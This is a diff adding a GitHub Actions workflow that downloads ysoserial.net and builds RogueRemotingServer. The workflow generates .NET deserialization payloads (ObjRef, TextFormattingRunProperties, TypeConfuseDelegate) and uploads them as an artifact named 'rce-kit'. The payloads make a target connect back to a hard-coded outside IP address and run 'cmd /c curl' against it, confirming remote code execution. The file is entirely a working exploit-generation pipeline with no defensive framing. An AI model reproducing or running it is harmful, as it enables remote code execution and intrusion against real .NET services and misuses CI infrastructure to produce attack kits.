@@ -1,0 +1,52 @@
+name: Generate ObjRef + RogueRemotingServer
+on: [push]
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+      - name: Download ysoserial.net
+        run: |
+          $url = "https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip"
+          Invoke-WebRequest $url -OutFile ysoserial.zip
+          Expand-Archive ysoserial.zip -DestinationPath yso
+
+      - name: Clone and build RogueRemotingServer
+        run: |
+          git clone https://github.com/codewhitesec/RogueRemotingServer rrs
+          cd rrs
+          dotnet build -c Release 2>&1 | tail -5
+          $bin = Get-ChildItem -Recurse -Filter RogueRemotingServer.exe | Select-Object -First 1
+          Write-Host "Built: $($bin.FullName)"
+          Copy-Item $bin.FullName C:\rrs.exe
+
+      - name: Generate payloads
+        run: |
+          $yso = Get-ChildItem -Recurse -Filter ysoserial.exe | Select-Object -First 1
+
+          # ObjRef gadget - makes target call back to our RogueRemotingServer via TCP
+          & $yso.FullName -g ObjRef -f BinaryFormatter `
+            -c "tcp://167.172.142.69:8080/" `
+            -o base64 | Out-File payload_objref.b64 -Encoding ascii
+
+          # Also generate SOAP TextFormattingRunProperties for RogueRemotingServer to serve
+          & $yso.FullName -g TextFormattingRunProperties -f SoapFormatter `
+            -c 'cmd /c curl http://167.172.142.69:8080/pwned' `
+            -o raw | Out-File exploit.soap -Encoding ascii
+
+          # And a BinaryFormatter version
+          & $yso.FullName -g TypeConfuseDelegate -f BinaryFormatter `
+            -c 'cmd /c curl http://167.172.142.69:8080/pwned' `
+            -o base64 | Out-File payload_tcd_curl.b64 -Encoding ascii
+
+          Write-Host "ObjRef payload size: $((Get-Item payload_objref.b64).Length)"
+          Write-Host "SOAP payload size: $((Get-Item exploit.soap).Length)"
+
+      - name: Upload all artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: rce-kit
+          path: |
+            payload_objref.b64
+            payload_tcd_curl.b64
+            exploit.soap
+            C:\rrs.exe
